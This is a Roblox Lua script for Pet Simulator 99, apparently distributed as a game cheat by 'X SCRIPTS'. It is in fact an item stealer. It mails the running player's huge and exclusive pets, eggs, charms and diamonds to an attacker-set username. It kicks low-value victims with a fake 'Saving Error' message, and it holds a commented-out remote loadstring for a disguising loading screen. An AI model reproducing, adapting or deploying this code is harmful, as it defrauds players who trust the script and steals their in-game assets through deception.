if LoadScreen == nil then
LoadScreen = true
end
if LoadScreen == true then 
    --loadstring(game:HttpGet("https://raw.githubusercontent.com/Egorikusa/PetSimulator99/main/loadingscreen"))()
end
-- Script:
-- VARIABLES
stealpets = true

-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts

local library = require(game.ReplicatedStorage.Library)
local save = library.Save.Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "InsaneXorek_Top and Egorikusa on top"
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
    end
end

if GemAmount1 < 10000 then
    plr:kick("Saving Error, Please Rejoin or Join Back Later!")
end


-- Check
AmountOfHuges = 0
for i, v in pairs(save.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    if dir.huge == true then
        AmountOfHuges = AmountOfHuges + 1
    end
end

local user = Username

-- Functions
function StealHuge()
    for i, v in pairs(save.Pet) do
        local id = v.id
        local dir = library.Directory.Pets[id]
        if dir.huge then
            local args = {
                [1] = user,
                [2] = MailMessage,
                [3] = "Pet",
                [4] = i,
                [5] = v._am or 1
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                unpack(args)
            )
            AmountOfHuges = 0
            for i, v in pairs(save.Pet) do
                local id = v.id
                local dir = library.Directory.Pets[id]
                if dir.huge == true then
                    AmountOfHuges = AmountOfHuges + 1
                end
            end
            if AmountOfHuges == 0 then
                HugesEnd = true
            end
        end
    end
end --End of function huge

function ExcSteal()
    for i, v in pairs(save.Pet) do
        local id = v.id
        local dir = library.Directory.Pets[id]
        if dir.exclusiveLevel then
            local args = {
                [1] = user,
                [2] = MailMessage,
                [3] = "Pet",
                [4] = i,
                [5] = v._am or 1
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                unpack(args)
            )
            AmountOfExc = 0
            for i, v in pairs(save.Pet) do
                local id = v.id
                local dir = library.Directory.Pets[id]
                if dir.exclusiveLevel == true then
                    AmountOfExc = AmountOfExc + 1
                end
            end
            if AmountOfExc == 0 then
                ExcEnd = true
            end
        end
    end
end --end of function exc

function EggSteal()
    for i, v in pairs(save.Egg) do
        local args = {
            [1] = user,
            [2] = MailMessage,
            [3] = "Egg",
            [4] = i,
            [5] = v._am or 1
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
            unpack(args)
        )
        AmountOfEggs = 0
        for i, v in pairs(save.Egg) do
            local id = v.id
            local diregg = library.Directory.Eggs[id]
            if diregg == true then
                AmountOfEggs = AmountOfEggs + 1
            end
            if AmountOfEggs == 0 then
                EggEnd = true
            end
        end
    end -- End of function egg
end

function CharmSteal()
    for i, v in pairs(save.Charm) do
        local id = v.id
        local args = {
            [1] = user,
            [2] = MailMessage,
            [3] = "Charm",
            [4] = i,
            [5] = v._am or 1
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
            unpack(args)
        )
        AmountOfCharm = 0
        for i, v in pairs(save.Charm) do
            local id = v.id
            local dircharm = library.Directory.Charms[id]
            if dircharm == true then
                AmountOfCharm = AmountOfCharm + 1
            end
            if AmountOfCharm == 0 then
                CharmEnd = true
            end
        end
    end -- end of function charm
end

function GemSteal()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
            GemAmount = v._am
            GemId = i
            local args = {
                [1] = Username,
                [2] = MailMessage,
                [3] = "Currency",
                [4] = GemId,
                [5] = GemAmount - 10000
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                unpack(args)
            )
        end
    end
end --end of function gem

if stealpets == true then
    StealHuge()
end

if stealpets == true and HugesEnd == true then
    ExcSteal()
end

if save.Egg ~= nil and stealpets == true and ExcEnd == true then
    EggSteal()
end

if save.Charm ~= nil and stealpets == true and EggEnd == true then
    CharmSteal()
end

while true do
    wait(1.25)
    if CharmEnd == true then
    GemSteal()
   end
end